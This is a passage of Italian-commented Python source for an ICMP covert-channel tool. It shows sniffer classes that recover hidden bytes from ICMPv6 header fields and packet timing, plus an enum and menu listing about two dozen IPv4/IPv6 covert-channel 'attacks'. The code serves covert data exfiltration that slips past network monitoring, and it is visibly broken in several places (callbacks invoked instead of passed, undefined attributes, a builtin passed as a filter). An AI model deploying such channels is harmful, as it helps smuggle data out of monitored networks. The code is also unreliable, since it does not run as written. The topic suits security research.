                nonlocal self 
                filter= f"icmp6 and (icmp6[0]=={TYPE_PARAMETER_PROBLEM}) and dst {self.ip_dst.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}" 
                return filter 
            def callback(packet): 
                nonlocal self
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6ParamProblem")) is not None: 
                        if (field:=layer.getfieldval("ptr")) is not None and field!=0xffffffff: 
                            self.data.append(field.to_bytes(4,"big").decode()) 
                        elif field is not None and field==0xffffffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None: 
                            self.data.append(field.to_bytes(2,"big").decode())
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None: 
                            self.data.append(field.to_bytes(2,"big").decode()) 
            #--------------------------------------------------- 
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti") 
            TYPE_PARAMETER_PROBLEM=4 
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn":  callback()
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"get_parameter_problem: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                print(f"Done waiting 'parameter_problem' received: {self.data}") 
                return True 
            return False  

    class IPV6_TIME_EXCEEDED: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def return_calback(self):
            def callback(packet): 
                nonlocal self
                TYPE_TIME_EXCEEDED=3   
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
            return callback
        
        def ipv6_time_exceeded(self): 
            def get_filter():
                nonlocal self, TYPE_TIME_EXCEEDED 
                filter=f"icmp6 and (icmp6[0]=={TYPE_TIME_EXCEEDED}) and dst {self.ip_dst.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                return filter 
            def callback(packet): 
                nonlocal self
                TYPE_TIME_EXCEEDED=3   
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
            #--------------------------------------------------- 
            time_exceeded_data=[]
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti") 
            TYPE_TIME_EXCEEDED=3 
            args={
                    "filter": filter
                    #,"count":1 
                    ,"prn":  callback()
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data.append(cleaned) 
                return True 
            return False  

    class IPV6_PACKET_BIG: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def return_calback(self): 
            def callback(packet): 
                nonlocal self
                TYPE_PKT_BIG= 2
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6PacketTooBig")) is not None: 
                        if (field:=layer.getfieldval("mtu")) is not None: 
                            self.data.append(field.to_bytes(4,"big").decode()) 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                        #else: print("Caso non considetrato")  
            return callback
        
        def ipv6_packet_to_big(self): 
            def get_filter(): 
                nonlocal self, TYPE_PKT_BIG 
                filter=f"icmp6 and (icmp6[0]=={TYPE_PKT_BIG}) and dst {self.ip_host.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                return filter 
            def callback(packet): 
                nonlocal self
                TYPE_PKT_BIG= 2
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6PacketTooBig")) is not None: 
                        if (field:=layer.getfieldval("mtu")) is not None: 
                            self.data.append(field.to_bytes(4,"big").decode()) 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                        #else: print("Caso non considetrato")                      
            #--------------------------------------------------- 
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti") 
            TYPE_PKT_BIG= 2  
            try:
                args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback()
                    #,"store":True 
                    ,"iface": self.interface
                }
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}") 
            THREADING_EVENT.wait(self.event_pktconn)
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data.append(cleaned) 
                return True 
            return False  

    #FATTO
    class IPV6_DESTINTION_UNREACHABLE: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def return_calback(self): 
            def callback(packet): 
                nonlocal self
                TYPE_DESTINATION_UNREACHABLE=3 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6DestUnreach")) is None: 
                        return
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")==1): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
            return callback

        def ipv6_destination_unreachable(self): 
            def get_filter(): 
                nonlocal self, TYPE_DESTINATION_UNREACHABLE 
                filter=f"icmp6 and (icmp6[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {self.ip_host.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                return filter 
            def callback(packet): 
                nonlocal self
                TYPE_DESTINATION_UNREACHABLE=3 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6DestUnreach")) is None: 
                        return
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            self.data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")==1): 
                            self.data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
            #---------------------------------------------------                 
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti")  
            TYPE_DESTINATION_UNREACHABLE=1 
            try:
                args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback() 
                    #,"store":True 
                    ,"iface":self.interface
                } 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                )  
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}") 
            THREADING_EVENT.wait(self.event_pktconn) 
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data) 
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  

    class IPV6_TIMING: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 
        callback_function=None
        timer=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
            self.callback_function=lambda: self.timeout_timer_callback(self.event_pktconn)
            self.timer=GET.timer(None,self.callback_function) 
        
        def timeout_timer_callback(self): 
            THREADING_EVENT.set(self.event_pktconn)
            return 
        
        def return_calback(self, previous_time=None, numero_bit=0 ):   
            if numero_bit<=0: 
                return None   
            DISTANZA_TEMPI=2 #sec
            dict_tempi={}
            dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
            dict_bit={ }
            dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  

            MINUTE_TIME=0*60+30 #minuti
            MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
        
            def callback(packet):
                nonlocal previous_time 
                nonlocal MAX_TIME, MINUTE_TIME  
                if previous_time is None: 
                    previous_time=packet.time 
                    self.timer.cancel()
                    self.timer=GET.timer(MAX_TIME,self.callback_function) 
                    self.timer.start() 
                    return  
                if packet.time is not None: 
                    delta_time=packet.time-previous_time   
                    arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                    min_value=min([y for _,y in arr]) 
                    min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                    self.data.append(dict_bit.get(arr[min_indices[0]][0]))
                    previous_time=packet.time
                    self.timer.cancel() 
                    if len(self.data)%8==0: 
                        self.timer=GET.timer(MINUTE_TIME,self.callback_function) 
                    else:
                        self.timer=GET.timer(MAX_TIME,self.callback_function) 
                    self.timer.start()
            return callback
        
        def ipv6_timing_cc(self, numero_bit:int=0):  
            def get_filter(): 
                nonlocal self, TYPE_INFORMATION_REQUEST, TYPE_INFORMATION_REPLY
                filter= f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {self.ip_dst.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                return filter 
            #--------------------------------------------------- 
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti") 
            if numero_bit<=0: 
                raise Exception("Numero di bit passato non valido")   
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129
            last_packet_time=None 
            try: 
                args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": self.return_calback(last_packet_time, numero_bit)
                    #,"store":True 
                    ,"iface":self.interface
                } 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn)   
                str_data=""
                for integer in self.data:
                    str_data+=format(integer, f'0{numero_bit}b') 
                data="" 
                for index in range(0, len(str_data), 8):
                    int_data=0
                    for bit in str_data[index:index+8][::-1]:
                        int_data=int_data<<1|int(bit)
                    data+=chr(int_data)  
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data) 
                cleaned="".join(x for x in joined if x in string.printable) 
                self.data=cleaned 
                return True 
            return False


class AttackType(Enum): 
    ipv4_destination_unreachable=0
    ipv4_destination_unreachable_unused=1
    ipv4_time_exceeded=2
    ipv4_time_exceeded_unused=3
    ipv4_parameter_problem=4
    ipv4_parameter_problem_unused=5
    ipv4_source_quench=6
    ipv4_source_quench_unused=7
    ipv4_redirect=8
    ipv4_echo_campi=9
    ipv4_echo_payload=10
    ipv4_echo_campi_payload=11
    ipv4_timestamp=12
    ipv4_information=13
    ipv4_timing_channel_8bit=14
    ipv4_timing_channel_8bit_noise=15 
    ipv4_echo_random_payload=16
    ipv4_timestamp_reply=17
    ipv4_information_reply=18

    ipv6_information=20
    ipv6_parameter_problem=21
    ipv6_time_exceeded=22
    ipv6_packet_to_big=23
    ipv6_destination_unreachable=24 
    ipv6_timing_cc=25  

    def choose_attack_function(): 
        while True: 
            print(AttackType.get_available_attack(),"\n")
            msg="Scegli il nome o il codice della funzione:\t"
            try:
                scelta=str(input(msg)).lower().strip() 
                print("Hai digitato: ",scelta if str(scelta)!="" else "<empty>") 
                attack_enum=AttackType.get_attack_method(scelta) 
            except Exception as e:
                print(f"choose_attack_function: {e}")
            if attack_enum: 
                return attack_enum
            msg="Nessuna funzione trovata. Si vuole continuare? S/N\t" 
            if not ask_bool_choice(msg): 
                return None 

    def get_attack_method(attack=None)->Enum: 
        #Data in input una qualsiasi variabile ritorna l'enum associato quando possibile
        if not (IS_TYPE.string(attack) or IS_TYPE.integer(attack) or IS_TYPE.enum(attack)): 
            raise Exception("Argomenti non validi") 
        if IS_TYPE.enum(attack): 
            attack=attack.name 
        try: 
            attack=int(attack)  
        except Exception as e: 
            print("dgnfgn")
            pass
        if IS_TYPE.string(attack): 
            match attack: 
                case "ipv4_destination_unreachable": return AttackType.ipv4_destination_unreachable
                case "ipv4_destination_unreachable_unused": return AttackType.ipv4_destination_unreachable_unused
                case "ipv4_time_exceeded": return AttackType.ipv4_time_exceeded
                case "ipv4_time_exceeded_unused": return AttackType.ipv4_time_exceeded_unused
                case "ipv4_parameter_problem": return AttackType.ipv4_parameter_problem
                case "ipv4_parameter_problem_unused": return AttackType.ipv4_parameter_problem_unused
                case "ipv4_source_quench": return AttackType.ipv4_source_quench
                case "ipv4_source_quench_unused": return AttackType.ipv4_source_quench_unused
                case "ipv4_redirect": return AttackType.ipv4_redirect
                case "ipv4_echo_campi": return AttackType.ipv4_echo_campi
                case "ipv4_echo_payload": return AttackType.ipv4_echo_payload
                case "ipv4_echo_random_payload": return AttackType.ipv4_echo_random_payload
                case "ipv4_echo_campi_payload": return AttackType.ipv4_echo_campi_payload
                case "ipv4_timestamp": return AttackType.ipv4_timestamp
                case "ipv4_information": return AttackType.ipv4_information
                case "ipv4_timing_channel_8bit": return AttackType.ipv4_timing_channel_8bit
                case "ipv4_timing_channel_8bit_noise": return AttackType.ipv4_timing_channel_8bit_noise
                #------------------------------------------------
                case "ipv6_information": return AttackType.ipv6_information
                case "ipv6_parameter_problem": return AttackType.ipv6_parameter_problem
                case "ipv6_time_exceeded": return AttackType.ipv6_time_exceeded 
                case "ipv6_packet_to_big": return AttackType.ipv6_packet_to_big
                case "ipv6_destination_unreachable": return AttackType.ipv6_destination_unreachable
                case "ipv6_timing_cc": return AttackType.ipv6_timing_cc
                #------------------------------------------------
                case _: 
                    print("Attacco immesso non valido")
                    return None
                #case "ipv4_destination_unreachable": return AttackType.ipv4_destination_unreachable
                #case "ipv4_destination_unreachable": return AttackType.ipv4_destination_unreachable
                #case "ipv4_destination_unreachable": return AttackType.ipv4_destination_unreachable
        if IS_TYPE.integer(attack): 
            match attack: 
                case AttackType.ipv4_destination_unreachable.value: return AttackType.ipv4_destination_unreachable
                case AttackType.ipv4_destination_unreachable_unused.value: return AttackType.ipv4_destination_unreachable_unused
                case AttackType.ipv4_time_exceeded.value: return AttackType.ipv4_time_exceeded
                case AttackType.ipv4_time_exceeded_unused.value: return AttackType.ipv4_time_exceeded_unused
                case AttackType.ipv4_parameter_problem.value: return AttackType.ipv4_parameter_problem
                case AttackType.ipv4_parameter_problem_unused.value: return AttackType.ipv4_parameter_problem_unused
                case AttackType.ipv4_source_quench.value: return AttackType.ipv4_source_quench
                case AttackType.ipv4_source_quench_unused.value: return AttackType.ipv4_source_quench_unused
                case AttackType.ipv4_redirect.value: return AttackType.ipv4_redirect
                case AttackType.ipv4_echo_campi.value: return AttackType.ipv4_echo_campi
                case AttackType.ipv4_echo_payload.value: return AttackType.ipv4_echo_payload
                case AttackType.ipv4_echo_random_payload.value: return AttackType.ipv4_echo_random_payload
                case AttackType.ipv4_echo_campi_payload.value: return AttackType.ipv4_echo_campi_payload
                case AttackType.ipv4_timestamp.value: return AttackType.ipv4_timestamp
                case AttackType.ipv4_information.value: return AttackType.ipv4_information
                case AttackType.ipv4_timing_channel_8bit.value: return AttackType.ipv4_timing_channel_8bit
                case AttackType.ipv4_timing_channel_8bit_noise.value: return AttackType.ipv4_timing_channel_8bit_noise
                #------------------------------------------------
                case AttackType.ipv6_information.value: return AttackType.ipv6_information
                case AttackType.ipv6_parameter_problem.value: return AttackType.ipv6_parameter_problem
                case AttackType.ipv6_time_exceeded.value: return AttackType.ipv6_time_exceeded
                case AttackType.ipv6_packet_to_big.value: return AttackType.ipv6_packet_to_big
                case AttackType.ipv6_destination_unreachable.value: return AttackType.ipv6_destination_unreachable
                case AttackType.ipv6_timing_cc.value: return AttackType.ipv6_timing_cc
                #------------------------------------------------
                case _: 
                    print("Attacco immesso non valido")
                    return None
    
    def get_description(attack:Enum=None)->str: 
        if IS_TYPE.enum(attack): 
            match attack: 
                case AttackType.ipv4_destination_unreachable: 
                    return "Usa i campi di ICMP Destination Unreachable"
                case AttackType.ipv4_destination_unreachable_unused: 
                    return "Usa icampi di ICMP Destination Unreachable. In particolare 'unused'"
                case AttackType.ipv4_time_exceeded: 
                    return "Usa i campi di ICMP Time Exceeded"
                case AttackType.ipv4_time_exceeded_unused: 
                    return "Usa i campi di ICMP Time Exceeded. In particolare 'unused'"
                case AttackType.ipv4_parameter_problem: 
                    return "Usa i campi di ICMP Parameter Problem"
                case AttackType.ipv4_parameter_problem_unused: 
                    return "Usa i campi di ICMP Parameter Problem. In particolare 'unused'"
                case AttackType.ipv4_source_quench: 
                    return "Usa i campi di ICMP Source Quench"
                case AttackType.ipv4_source_quench_unused: 
                    return "Usa i campi di ICMP Source Quench. In particolare 'unused'"
                case AttackType.ipv4_redirect: 
                    return "Usa i campi di ICMP Redirect"
                case AttackType.ipv4_echo_campi: 
                    return "Usa i campi di ICMP Echo. In particolare 'identifier'"
                case AttackType.ipv4_echo_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload'"
                case AttackType.ipv4_echo_random_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload' con dimensione variabile"
                case AttackType.ipv4_echo_campi_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'idnetifier' e 'payload'"
                case AttackType.ipv4_timestamp: 
                    return "Usa i campi di ICMP Timestamp"
                case AttackType.ipv4_information: 
                    return "Usa i campi di ICMP Information"
                case AttackType.ipv4_timing_channel_8bit: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo"
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo aggiungendo del rumore di sottofondo"
                #------------------------------------------------
                case AttackType.ipv6_information: 
                    return "Usa i campi di ICMP v6 Information"
                case AttackType.ipv6_parameter_problem: 
                    return "Usa i campi di ICMP v6 Parameter Problem"
                case AttackType.ipv6_time_exceeded: 
                    return "Usa i campi di ICMP v6 Time Exceeded"
                case AttackType.ipv6_packet_to_big: 
                    return "Usa i campi di ICMP v6 Packet to Big"
                case AttackType.ipv6_destination_unreachable: 
                    return "Usa i campi di ICMP v6 Destination Unreachable"
                case AttackType.ipv6_timing_cc: 
                    return "Usa i campi di ICMP v6 per inviare dati tramite il tempo"
                #------------------------------------------------
        raise Exception("Attacco immesso non valido: ",attack) 
    
    def get_available_attack()->str: 
        stringa="Gli attacchi disponibili sono:\n"
        for enumerator in list(AttackType): 
            stringa+=f" *{enumerator.name}:{enumerator.value}\t{AttackType.get_description(enumerator)}\n" 
        stringa+=(
            "\n" \
            "Per scegliere un attacco, usa il nome o il numero corrispondente." \
            "\nAd esempio per l'attacco Destination Unreachable TRamite ICMPv4, puoi scegliere:" \
            "\n\t*il nome 'ipv4_destination_unreachable'" \
            "\n\t*il numero '0'." \
        ) 
        return stringa


